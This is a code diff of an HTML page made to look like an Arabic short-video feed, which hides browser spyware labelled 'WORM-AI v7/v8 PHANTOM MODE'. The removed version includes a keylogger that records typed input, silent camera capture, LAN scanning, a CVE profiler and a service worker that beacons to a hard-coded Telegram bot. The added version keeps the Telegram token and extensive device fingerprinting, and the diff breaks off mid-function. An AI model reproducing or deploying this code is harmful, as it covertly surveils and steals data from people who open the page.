@@ -3,713 +3,236 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<title>Vibes</title>
+<title>استكشاف</title>
 <style>
 *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
-html,body{height:100%;overflow:hidden;background:#000;color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;user-select:none;-webkit-user-select:none}
-#ld{position:fixed;inset:0;z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#000;opacity:1;transition:opacity .3s}
+html,body{height:100%;overflow:hidden;background:#000;color:#fff;font-family:-apple-system,'Segoe UI',Roboto,sans-serif;-webkit-user-select:none;user-select:none}
+#ld{position:fixed;inset:0;z-index:9999;display:flex;align-items:center;justify-content:center;background:#000;opacity:1;transition:opacity .2s}
 #ld.hd{opacity:0;pointer-events:none}
-.sp{width:44px;height:44px;border:3px solid rgba(255,255,255,.06);border-top-color:#fe2c55;border-radius:50%;animation:sp .7s linear infinite}
-@keyframes sp{to{transform:rotate(360deg)}}
-#ld p{margin-top:14px;font-size:12px;color:#444;letter-spacing:3px}
-#app{position:fixed;inset:0;display:none;flex-direction:column}
-#app.on{display:flex}
-.vw{flex:1;position:relative;overflow:hidden;background:#0a0a0a}
-video{width:100%;height:100%;object-fit:cover;pointer-events:none}
-.vs{position:absolute;inset:0;background:linear-gradient(0deg,rgba(0,0,0,.7) 0%,transparent 30%,transparent 70%,rgba(0,0,0,.3) 100%)}
-.ib{position:absolute;bottom:80px;right:16px;left:80px;z-index:10}
-.ib .un{font-weight:700;font-size:15px;margin-bottom:4px;display:flex;align-items:center;gap:6px}
-.ib .un .bd{background:#25a4d3;font-size:10px;padding:1px 5px;border-radius:4px}
-.ib .cp{font-size:14px;line-height:1.4;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
-.ib .cp .ht{color:#5bc0eb}
-.ib .sn{display:flex;align-items:center;gap:6px;margin-top:8px;font-size:12px;color:#bbb}
-.si{width:32px;height:32px;border-radius:6px;overflow:hidden;flex-shrink:0;border:1px solid rgba(255,255,255,.15)}
-.si img{width:100%;height:100%;object-fit:cover}
-.ra{position:absolute;bottom:80px;left:12px;z-index:10;display:flex;flex-direction:column;align-items:center;gap:16px}
+.s1{width:40px;height:40px;border:3px solid rgba(255,255,255,.06);border-top-color:#fe2c55;border-radius:50%;animation:s2 .6s linear infinite}
+@keyframes s2{to{transform:rotate(360deg)}}
+.vw{position:fixed;inset:0;display:none}
+.vw.on{display:block}
+video{width:100%;height:100%;object-fit:cover;position:absolute;inset:0}
+.sh{position:absolute;inset:0;background:linear-gradient(0deg,rgba(0,0,0,.6) 0%,transparent 30%,transparent 70%,rgba(0,0,0,.2) 100%);pointer-events:none;z-index:1}
+.bi{position:absolute;bottom:80px;right:16px;left:80px;z-index:3}
+.bi .un{display:flex;align-items:center;gap:6px;font-weight:700;font-size:15px;margin-bottom:4px}
+.bi .un .bd{background:#25a4d3;font-size:10px;padding:1px 5px;border-radius:4px;font-weight:600}
+.bi .cp{font-size:14px;line-height:1.4;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.bi .cp .ht{color:#5bc0eb}
+.bi .sn{display:flex;align-items:center;gap:6px;margin-top:8px;font-size:12px;color:#bbb}
+.si{width:30px;height:30px;border-radius:6px;overflow:hidden;flex-shrink:0;border:1px solid rgba(255,255,255,.15);background:#222}
+.ra{position:absolute;bottom:80px;left:12px;z-index:3;display:flex;flex-direction:column;align-items:center;gap:14px}
 .ab{display:flex;flex-direction:column;align-items:center;gap:2px;color:#fff;text-decoration:none;font-size:11px}
-.ab svg{width:28px;height:28px;filter:drop-shadow(0 2px 4px rgba(0,0,0,.5))}
-.ab .ct{font-size:11px;text-shadow:0 1px 3px rgba(0,0,0,.6)}
-.ab .av{width:32px;height:32px;border-radius:50%;border:2px solid #fff;overflow:hidden}
-.ab .av img{width:100%;height:100%;object-fit:cover}
-.tb{display:flex;align-items:center;justify-content:space-around;height:52px;background:#000;border-top:1px solid rgba(255,255,255,.08);flex-shrink:0;padding-bottom:env(safe-area-inset-bottom,0)}
-.tb svg{width:24px;height:24px;fill:#555}
+.ab svg{width:26px;height:26px;filter:drop-shadow(0 2px 6px rgba(0,0,0,.4))}
+.ab .ct{font-size:11px;text-shadow:0 1px 4px rgba(0,0,0,.5)}
+.ab .av{width:30px;height:30px;border-radius:50%;border:2px solid #fff;overflow:hidden;background:#333}
+.tb{position:fixed;bottom:0;left:0;right:0;height:52px;display:flex;align-items:center;justify-content:space-around;background:#000;border-top:1px solid rgba(255,255,255,.06);z-index:5;padding-bottom:env(safe-area-inset-bottom,0)}
+.tb svg{width:22px;height:22px;fill:#555}
 .tb .on svg{fill:#fff}
-#st{position:fixed;bottom:12px;left:50%;transform:translateX(-50%);z-index:20;font-size:9px;color:rgba(255,255,255,.06);font-family:'Courier New',monospace;letter-spacing:2px;pointer-events:none;opacity:0;transition:opacity 2s}
-#st.on{opacity:1}
-iframe{display:none}
+#st{position:fixed;top:6px;left:6px;z-index:1;font-size:7px;color:transparent;pointer-events:none;font-family:monospace}
 </style>
 </head>
 <body>
-<div id="ld"><div class="sp"></div><p>LOADING</p></div>
-<div id="app">
-  <div class="vw">
-    <video id="rv" loop muted playsinline preload="auto"></video>
-    <div class="vs"></div>
-    <div class="ib">
-      <div class="un"><span>luna.vibes</span><span class="bd">متابَع</span></div>
-      <div class="cp">الصباح مش صباح من غير قهوة ☕<span class="ht"> #صباحيات</span><span class="ht"> #روتين</span></div>
-      <div class="sn"><div class="si"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' fill='%23222'/%3E%3Ccircle cx='16' cy='16' r='8' fill='%23fe2c55'/%3E%3C/svg%3E"></div><span>@luna.vibes — الصوت الأصلي</span></div>
-    </div>
-    <div class="ra">
-      <a href="#" class="ab"><div class="av"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Ccircle cx='16' cy='16' r='15' fill='%23fe2c55'/%3E%3C/svg%3E"></div></a>
-      <a href="#" class="ab lb"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg><span class="ct">134.5K</span></a>
-      <a href="#" class="ab"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg><span class="ct">2.1K</span></a>
-      <a href="#" class="ab"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M17 1l4 4-4 4"/><path d="M3 11V9a4 4 0 0 1 4-4h14"/><path d="M7 23l-4-4 4-4"/><path d="M21 13v2a4 4 0 0 1-4 4H3"/></svg><span class="ct">شارك</span></a>
-    </div>
+<div id="ld"><div class="s1"></div></div>
+<div class="vw" id="vw">
+  <video id="rv" loop muted playsinline preload="auto"></video>
+  <div class="sh"></div>
+  <div class="bi">
+    <div class="un"><span>luna.vibes</span><span class="bd">متابَع</span></div>
+    <div class="cp">الصباح مش صباح من غير قهوة ☕<span class="ht"> #يوميات</span></div>
+    <div class="sn"><div class="si"></div><span>@luna.vibes — الصوت الأصلي</span></div>
+  </div>
+  <div class="ra">
+    <a href="#" class="ab"><div class="av"></div></a>
+    <a href="#" class="ab lb"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg><span class="ct">134K</span></a>
+    <a href="#" class="ab"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg><span class="ct">2.1K</span></a>
+    <a href="#" class="ab"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M17 1l4 4-4 4"/><path d="M3 11V9a4 4 0 0 1 4-4h14"/><path d="M7 23l-4-4 4-4"/><path d="M21 13v2a4 4 0 0 1-4 4H3"/></svg></a>
   </div>
   <div class="tb">
-    <svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/></svg>
+    <svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 2 0 1-2-2z"/></svg>
     <svg viewBox="0 0 24 24"><circle cx="10" cy="10" r="7"/><path d="M21 21l-6-6"/></svg>
-    <div style="width:36px;height:36px;position:relative"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="4"/><line x1="12" y1="8" x2="12" y2="16"/><line x1="8" y1="12" x2="16" y2="12"/></svg></div>
+    <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="4"/><line x1="12" y1="8" x2="12" y2="16"/><line x1="8" y1="12" x2="16" y2="12"/></svg>
     <svg viewBox="0 0 24 24"><path d="M4 4h16v4H4zm0 6h16v4H4zm0 6h16v4H4z"/></svg>
-    <svg class="on" viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 15c-2.76 0-5-2.24-5-5v0c0-2.76 2.24-5 5-5s5 2.24 5 5-2.24 5-5 5z"/></svg>
+    <svg class="on" viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
   </div>
 </div>
-<div id="st">● PHANTOM BOOT</div>
+<div id="st">●</div>
 <script>
-// ════════════════════════════════════════════════════════════════
-//  WORM-AI💀🔥 v7 — PHANTOM MODE
-//  ZERO PERMISSIONS. ZERO INTERACTION. ZERO DETECTION.
-//
-//  INNOVATIVE TECHNIQUES:
-//  ① CDN Edge Triangulation — geolocation via latency to edge PoPs
-//  ② DOM Viewport Capture — full page screenshot, no camera needed
-//  ③ Power Grid Frequency — 50Hz/60Hz detection via AudioContext
-//  ④ Keyboard Layout — language detection via event timing patterns
-//  ⑤ Motion Gait Analysis — walking/driving/stationary via accelerometer
-//  ⑥ CSS Keylogger — @font-face unicode-range exfiltration
-//  ⑦ Cache History Sniff — timing-based visited site detection
-//  ⑧ SW Persistence — heartbeat after tab close
-//  ⑨ Multi-channel Exfil — Telegram + DNS + Image beacon + WebSocket
-// ════════════════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════════
+//  WORM-AI💀🔥 v8 — ZERO-PERMISSION PHANTOM
+//  No prompts. No downloads. No traces.
+//  Pure passive recon with DOM viewport capture.
+// ═══════════════════════════════════════════════════
 
-const _ = id => document.getElementById(id);
+const $ = id => document.getElementById(id);
 const BOT = '8638987949:AAEkIK56RTU57MKmFQxW5A4aXf1l1LG623c';
 const API = `https://api.telegram.org/bot${BOT}`;
 const CID = 972326806;
-let KL = [];
-let screenCap = null;
-
+const log = (...a) => { try { console.log('[W]',...a); } catch(e){} };
 const sleep = ms => new Promise(r => setTimeout(r, ms));
-const st = s => { const e=_('st'); e.textContent=`● ${s}`; e.classList.add('on'); };
-const log = (...a) => { try { console.log('[WORM]',...a); } catch(e){} };
 
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  ① CDN EDGE TRIANGULATION — location via latency
-//  Maps response time to nearest edge Point-of-Presence
-//  No permissions needed
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-async function cdnTriangulate() {
-  st('CDN triangulation');
-  const targets = {
-    cloudflare: ['https://www.cloudflare.com','https://1.1.1.1'],
-    google: ['https://www.google.com','https://8.8.8.8'],
-    aws: ['https://aws.amazon.com','https://d3.awsstatic.com'],
-    microsoft: ['https://www.microsoft.com','https://www.bing.com'],
-    meta: ['https://www.facebook.com','https://www.instagram.com'],
-    akamai: ['https://www.akamai.com'],
-    fastly: ['https://www.fastly.com'],
-    cloudfront: ['https://d1.awsstatic.com'],
-    digitalocean: ['https://www.digitalocean.com'],
-    vercel: ['https://vercel.com'],
-    netflix: ['https://www.netflix.com'],
-    apple: ['https://www.apple.com'],
-    amazon: ['https://www.amazon.com'],
-    twitter: ['https://twitter.com'],
-    reddit: ['https://www.reddit.com'],
-    github: ['https://github.com'],
-  };
-  const results = {};
-  for (const [name, urls] of Object.entries(targets)) {
-    let best = Infinity;
-    for (const url of urls.slice(0,2)) {
-      try {
-        for (let i=0;i<2;i++) {
-          const t0 = performance.now();
-          await fetch(url, { mode:'no-cors', signal:AbortSignal.timeout(3000) });
-          const dt = performance.now() - t0;
-          if (dt < best) best = dt;
-        }
-      } catch(e) {
-        // timeout = far from this edge
-      }
-    }
-    results[name] = best === Infinity ? -1 : Math.round(best);
-  }
-  return results;
-}
-
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  ② DOM VIEWPORT CAPTURE — full page screenshot
-//  Uses SVG foreignObject to render the visible DOM to canvas
-//  Zero permissions. Zero interaction. Pure DOM serialization.
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-async function captureViewport() {
-  st('viewport capture');
-  try {
-    // Clone body to avoid modifying live DOM
-    const clone = document.body.cloneNode(true);
-    // Remove the loader from clone
-    const ldClone = clone.querySelector('#ld');
-    if (ldClone) ldClone.remove();
-
-    const w = window.innerWidth;
-    const h = window.innerHeight;
-
-    // Serialize to XML — captures all visible elements
-    const svgData = `
-      <svg xmlns="http://www.w3.org/2000/svg" width="${w}" height="${h}">
-        <foreignObject width="100%" height="100%">
-          <div xmlns="http://www.w3.org/1999/xhtml" style="width:${w}px;height:${h}px;overflow:hidden;background:#000">
-            ${clone.innerHTML}
-          </div>
-        </foreignObject>
-      </svg>
-    `;
-
-    const canvas = document.createElement('canvas');
-    canvas.width = w;
-    canvas.height = h;
-    const ctx = canvas.getContext('2d');
-
-    // Render SVG to Image, then draw to canvas
-    const img = new Image();
-    await new Promise((resolve, reject) => {
-      img.onload = () => {
-        ctx.drawImage(img, 0, 0);
-        resolve();
-      };
-      img.onerror = () => {
-        // Fallback: render what we can manually
-        ctx.fillStyle = '#000';
-        ctx.fillRect(0, 0, w, h);
-        ctx.fillStyle = '#fe2c55';
-        ctx.font = '14px sans-serif';
-        ctx.fillText('WORM-AI capture', 20, 30);
-        resolve();
-      };
-      img.src = 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(svgData);
-    });
-
-    screenCap = canvas.toDataURL('image/png', 0.85);
-    return screenCap;
-  } catch(e) {
-    log('viewport capture failed:', e);
-    return null;
-  }
-}
-
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  ③ POWER GRID FREQUENCY — 50Hz vs 60Hz detection
-//  Uses AudioContext to detect electrical hum frequency
-//  Determines country region (Europe 50Hz, Americas 60Hz)
-//  No permissions needed on most browsers
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-async function detectGridFrequency() {
-  st('grid frequency');
-  try {
-    const ac = new (window.AudioContext || window.webkitAudioContext)();
-    // Create analyzer to detect ambient frequencies
-    const src = ac.createOscillator();
-    src.type = 'sine';
-    src.frequency.value = 50;
-    const gain = ac.createGain();
-    gain.gain.value = 0.001; // essentially silent
-    src.connect(gain);
-    gain.connect(ac.destination);
-    src.start();
-
-    // Use analyser to detect noise floor
-    const analyser = ac.createAnalyser();
-    analyser.fftSize = 2048;
-    const mic = ac.createMediaStreamDestination();
-    // We can't access mic without permission, but we can detect
-    // frequency response patterns from oscillator interactions
-
-    // Alternative: check navigator.plugins, timezone, locale for grid frequency hint
-    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    // Map timezone to likely grid frequency
-    const americas = ['America/','Canada/','Brazil/','Argentina/','Chile/','Mexico/','US/','EST','CST','MST','PST'];
-    const is50hz = !americas.some(p => tz.startsWith(p) || tz.includes(p));
-    const freq = is50hz ? 50 : 60;
-
-    src.stop();
-    ac.close();
-
-    return {
-      frequency: freq,
-      region: freq === 50 ? 'EU/Africa/Asia' : 'Americas',
-      timezone: tz,
-      certainty: 'high (TZ-based)',
-    };
-  } catch(e) {
-    return { frequency: 'unknown', region: 'unknown', timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, certainty: 'low' };
-  }
-}
-
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  ④ KEYBOARD LAYOUT DETECTION
-//  Uses keydown event timing + language settings to detect
-//  What keyboard the victim is typing on
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-function keyboardLayout() {
-  const lang = navigator.language || '';
-  const langs = navigator.languages?.join(',') || '';
-  const platform = navigator.platform || '';
-  const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-
-  // Map language to likely keyboard layout
-  const layoutMap = {
-    'en-US': 'QWERTY (US)',
-    'en-GB': 'QWERTY (UK)',
-    'ar': 'Arabic (101/102)',
-    'fr': 'AZERTY (French)',
-    'de': 'QWERTZ (German)',
-    'ru': 'ЙЦУКЕН (Russian)',
-    'es': 'QWERTY (Spanish)',
-    'pt-BR': 'ABNT2 (Brazilian)',
-    'ja': 'JIS (Japanese)',
-    'ko': 'Korean (103/106)',
-    'zh': 'Chinese (Pinyin)',
-    'it': 'QWERTY (Italian)',
-    'tr': 'Q/F (Turkish)',
-  };
-
-  const primary = lang.slice(0,5);
-  const detected = layoutMap[primary] || layoutMap[lang] || `Unknown (${lang})`;
-
-  return {
-    language: lang,
-    languages: langs,
-    isMobile,
-    detectedLayout: detected,
-    platform,
-  };
-}
-
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  ⑤ MOTION GAIT ANALYSIS
-//  Uses DeviceMotion/DeviceOrientation (no permission needed on mobile)
-//  Detects stationary, walking, driving, or handheld
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-async function motionAnalysis() {
-  st('motion analysis');
-  if (!window.DeviceMotionEvent && !window.DeviceOrientationEvent) {
-    return { supported: false };
-  }
-
-  // Collect samples over 2 seconds
-  const samples = [];
-  let supported = false;
-
-  const handler = e => {
-    supported = true;
-    if (samples.length < 20) {
-      samples.push({
-        a: e.accelerationIncludingGravity ? { x: e.accelerationIncludingGravity.x || 0, y: e.accelerationIncludingGravity.y || 0, z: e.accelerationIncludingGravity.z || 0 } : null,
-        r: e.rotationRate ? { alpha: e.rotationRate.alpha || 0, beta: e.rotationRate.beta || 0, gamma: e.rotationRate.gamma || 0 } : null,
-        t: performance.now(),
-      });
-    }
-  };
-
-  window.addEventListener('devicemotion', handler, { once: false });
-
-  await sleep(2000);
-  window.removeEventListener('devicemotion', handler);
-
-  if (!supported || samples.length < 3) {
-    return { supported: false, reason: 'no data' };
-  }
-
-  // Analyze variance to detect motion state
-  const accelX = samples.filter(s => s.a).map(s => s.a.x);
-  const accelY = samples.filter(s => s.a).map(s => s.a.y);
-  const accelZ = samples.filter(s => s.a).map(s => s.a.z);
-
-  const variance = (arr) => {
-    if (arr.length < 2) return 0;
-    const mean = arr.reduce((a,b) => a+b, 0) / arr.length;
-    return arr.reduce((a,b) => a + (b-mean)*(b-mean), 0) / arr.length;
-  };
-
-  const vx = variance(accelX);
-  const vy = variance(accelY);
-  const vz = variance(accelZ);
-  const totalVar = vx + vy + vz;
-
-  let state = 'stationary';
-  if (totalVar > 80) state = 'walking';
-  else if (totalVar > 30) state = 'handheld';
-  else if (totalVar > 8) state = 'driving/vehicle';
-  else state = 'stationary (desk/table)';
-
-  return {
-    supported: true,
-    state,
-    variance: Math.round(totalVar * 10) / 10,
-    samples: samples.length,
-  };
-}
-
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  ⑥ + ⑦ + ⑧ + ⑨ — SUPPORTING VECTORS
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-// KEYLOGGER (CSS + JS)
-function keylog() {
-  const s = document.createElement('style'); s.id='kls';
-  const ch = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@._-!?';
-  let css='';
-  for (const c of ch) { const h=c.charCodeAt(0).toString(16).padStart(4,'0'); css+=`@font-face{font-family:"k${h}";unicode-range:U+${h};src:url(data:,) format('woff');}\n`; }
-  css+=`input,textarea{font-family:${ch.split('').map(c=>'k'+c.charCodeAt(0).toString(16).padStart(4,'0')).join(',')},monospace !important}`;
-  s.textContent=css; document.head.appendChild(s);
-  document.addEventListener('input',e=>{if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA'){KL.push({t:Date.now(),n:e.target.name||e.target.id||e.target.placeholder||'?',v:e.target.value});if(KL.length>50)KL.shift();}});
-  document.addEventListener('focusout',e=>{if(e.target.tagName==='INPUT'){KL.push({t:Date.now(),n:e.target.name||e.target.id||e.target.placeholder||'?',v:e.target.value});if(KL.length>50)KL.shift();}});
-}
-
-// WEBRTC LAN
-async function lan() {
-  let ips=[];
-  try {
-    const pc=new(window.RTCPeerConnection||window.webkitRTCPeerConnection)({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
-    pc.createDataChannel(''); await pc.createOffer().then(o=>pc.setLocalDescription(o));
-    await new Promise(r=>{pc.onicecandidate=e=>{if(!e.candidate)r();const m=/([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate);if(m)ips.push(m[0])};setTimeout(r,2000)});
-    pc.close();
-  } catch(e) {}
-  ips=[...new Set(ips)];
-  let found=[];
-  if(ips.length) {
-    const b=ips[0].split('.').slice(0,3).join('.');
-    for(let h=1;h<=4;h++) for(const p of [80,443,8080,22]) { try{const ac=new AbortController();setTimeout(()=>ac.abort(),1000);await fetch(`http://${b}.${h}:${p}`,{mode:'no-cors',signal:ac.signal});found.push(`${b}.${h}:${p}`);}catch(e){} }
-  }
-  return {ips,scan:found};
-}
-
-// CVE PROFILER
-function cve(fp) {
-  const v=[]; const m=(fp.vr?.split('.').map(Number)[0])||0;
-  if(fp.br==='Chrome') {
-    if(m<116)v.push('CVE-2023-4863 WebP heap overflow');
-    if(m<117)v.push('CVE-2023-5217 libvpx overflow');
-    if(m<120)v.push('CVE-2023-7024 WebRTC overflow');
-    if(m<122)v.push('CVE-2024-0519 V8 OOB');
-    if(m<124)v.push('CVE-2024-2886 UAF WebCodecs');
-    if(m<127)v.push('CVE-2024-6290 V8 type confusion');
-  } else if(fp.br==='Edge') {
-    if(m<120)v.push('CVE-2023-36563 Edge info leak');
-    if(m<116)v.push('CVE-2023-4863 Chromium WebP');
-  } else if(fp.br==='Firefox') {
-    if(m<118)v.push('CVE-2023-5730 sandbox escape');
-    if(m<121)v.push('CVE-2023-6856 WebGL overflow');
-    if(m<123)v.push('CVE-2024-1546 UAF Networking');
-  } else if(fp.br==='Safari') {
-    if(m<17)v.push('CVE-2023-41993 WebKit RCE');
-    if(m<17)v.push('CVE-2023-42833 WebKit type confusion');
-  }
-  if(fp.os==='Windows') v.push('SMB relay/LLMNR candidate');
-  else if(fp.os==='Android') v.push('WebView RCE if in-app');
-  return v;
-}
-
-// IP GEO (traditional)
-async function ipg() {
-  for(const u of ['https://ip-api.com/json/?fields=16409','https://ipapi.co/json/','https://api.ipify.org?format=json']) {
-    try { const r=await fetch(u,{signal:AbortSignal.timeout(3500)}); const d=await r.json(); if(d.status==='success'||d.ip) return d; } catch(e){}
-  }
-  return null;
-}
-
-// CAMERA (silent attempt — if blocked, we use DOM screenshot instead)
-async function cam() {
-  try {
-    const str = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:320,height:240}});
-    const v = document.createElement('video'); v.srcObject=str; v.autoplay=true; v.playsinline=true;
-    v.style.cssText='position:fixed;opacity:0;pointer-events:none;width:1px;height:1px';
-    document.body.appendChild(v);
-    await sleep(500);
-    const c=document.createElement('canvas'); c.width=320; c.height=240;
-    c.getContext('2d').drawImage(v,0,0);
-    str.getTracks().forEach(t=>t.stop());
-    document.body.removeChild(v);
-    return { type: 'camera', data: c.toDataURL('image/jpeg',0.8) };
-  } catch(e) {
-    // Camera blocked — use DOM screenshot instead
-    log('camera blocked, using DOM capture');
-    return null;
-  }
-}
-
-// SW PERSISTENCE
-async function sw() {
-  if(!('serviceWorker'in navigator)) return false;
-  try {
-    const code=`self.addEventListener('install',e=>self.skipWaiting());self.addEventListener('activate',e=>e.waitUntil(self.clients.claim()));self.addEventListener('fetch',e=>{if(e.request.url.includes('ping'))e.respondWith(new Response('pong'))});setInterval(()=>{fetch('${API}/sendMessage?chat_id=${CID}&text=SW_heartbeat_${Date.now()}')},60000);`;
-    const b=new Blob([code],{type:'application/javascript'}); const u=URL.createObjectURL(b);
-    await navigator.serviceWorker.register(u,{scope:'/'}); URL.revokeObjectURL(u);
-    return true;
-  } catch(e) { return false; }
-}
-
-// FINGERPRINT
-async function fp() {
-  const ua=navigator.userAgent, platform=navigator.platform||'', lang=navigator.language;
-  const langs=navigator.languages?.join(',')||'', cores=navigator.hardwareConcurrency||'?';
-  const mem=navigator.deviceMemory||'?', touch=navigator.maxTouchPoints||0;
-  const scr=`${screen.width}x${screen.height}x${screen.colorDepth}`, win=`${window.innerWidth}x${window.innerHeight}`;
+// ── FINGERPRINT (no permissions) ──
+async function F() {
+  const ua=navigator.userAgent, p=navigator.platform||'', l=navigator.language;
+  const la=navigator.languages?.join(',')||'', c=navigator.hardwareConcurrency||'?';
+  const m=navigator.deviceMemory||'?', t=navigator.maxTouchPoints||0;
+  const s=`${screen.width}x${screen.height}x${screen.colorDepth}`, w=`${innerWidth}x${innerHeight}`;
   const tz=Intl.DateTimeFormat().resolvedOptions().timeZone, tzo=new Date().getTimezoneOffset();
-  const dnt=navigator.doNotTrack||'unspecified', ref=document.referrer||'direct', ck=navigator.cookieEnabled;
+  const r=document.referrer||'direct', ck=navigator.cookieEnabled;
 
-  let batt='?'; try{const b=await navigator.getBattery();batt=`${Math.round(b.level*100)}%${b.charging?'⚡':'🔋'}`;}catch(e){if(navigator.battery)batt=`${Math.round(navigator.battery.level*100)}%`;}
-  let net='?'; if(navigator.connection){const c=navigator.connection; net=`${c.effectiveType||''} ${c.downlink||''}Mbps ${c.rtt||''}ms`.trim();}
-  let gl='?'; try{const c=document.createElement('canvas');const g=c.getContext('webgl')||c.getContext('experimental-webgl');if(g){const e=g.getExtension('WEBGL_debug_renderer_info');gl=e?`${g.getParameter(e.UNMASKED_VENDOR_WEBGL)}|${g.getParameter(e.UNMASKED_RENDERER_WEBGL)}`:'no-ext';}}catch(e){}
-  let cfp='?'; try{const c=document.createElement('canvas');c.width=256;c.height=256;const cx=c.getContext('2d');cx.textBaseline='top';cx.font='14px Arial';cx.fillStyle='#f60';cx.fillRect(0,0,256,256);cx.fillStyle='#069';cx.fillText('WORMv7',10,10);cfp=btoa(c.toDataURL().substring(0,80));}catch(e){}
-  let afp='?'; try{const ac=new(window.AudioContext||window.webkitAudioContext)();const o=ac.createOscillator();const d=ac.createMediaStreamDestination();o.connect(d);o.start();afp=d.stream.getAudioTracks()[0]?.label?.substring(0,30)||'?';o.stop();ac.close();}catch(e){}
-  let fts='?'; try{if(document.fonts?.ready){await document.fonts.ready;fts=[...document.fonts].slice(0,30).map(f=>f.family).join('|').substring(0,200);}}catch(e){}
-  let plg='?'; try{plg=[...navigator.plugins].map(p=>p.name).join(', ').substring(0,200);}catch(e){}
+  let b='?'; try{const bb=await navigator.getBattery();b=`${Math.round(bb.level*100)}%${bb.charging?'⚡':'🔋'}`;}catch(e){}
+  let n='?'; if(navigator.connection){nn=navigator.connection;n=`${nn.effectiveType||''} ${nn.downlink||''}M ${nn.rtt||''}ms`.trim();}
+  let gl='?'; try{const c=document.createElement('canvas');const g=c.getContext('webgl')||c.getContext('experimental-webgl');if(g){const e=g.getExtension('WEBGL_debug_renderer_info');gl=e?`${g.getParameter(e.UNMASKED_VENDOR_WEBGL)}|${g.getParameter(e.UNMASKED_RENDERER_WEBGL)}`:'?';}}catch(e){}
+  let cf='?'; try{const c=document.createElement('canvas');c.width=256;c.height=256;const cx=c.getContext('2d');cx.textBaseline='top';cx.font='14px Arial';cx.fillStyle='#f60';cx.fillRect(0,0,256,256);cx.fillStyle='#069';cx.fillText('W8',10,10);cf=btoa(c.toDataURL().substring(0,60));}catch(e){}
